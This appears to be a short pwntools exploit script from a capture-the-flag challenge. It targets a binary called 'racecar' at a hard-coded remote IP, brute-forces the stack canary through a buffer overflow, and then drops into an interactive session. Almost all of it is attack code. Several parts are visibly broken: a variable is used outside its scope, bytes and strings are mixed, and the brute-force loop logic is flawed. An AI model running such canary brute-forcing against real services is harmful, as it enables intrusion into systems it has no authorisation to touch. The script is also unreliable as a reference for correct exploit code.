#!/usr/bin/python3

from pwn import *

# exe = ELF('racecar', checksec=False)

# context.binary = exe


# def GDB():
#     if not args.REMOTE:
#         gdb.attach(p, gdbscript='''


#                 c
#                 ''')
#         input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('188.166.220.129', 10001)
else:
    p = remote('188.166.220.129', 10001)


def canarry_brute():
    payload = b"a" * 39
    for bytes in range(8):
        for i in range(256):
            str = p.recvuntil(b'> ')
            s(payload + p8(i))
            if str.find(b"***") == -1:
                payload += p8(i)
                # s(payload)


canarry_brute()
info("canary: " + payload)
p.interactive()
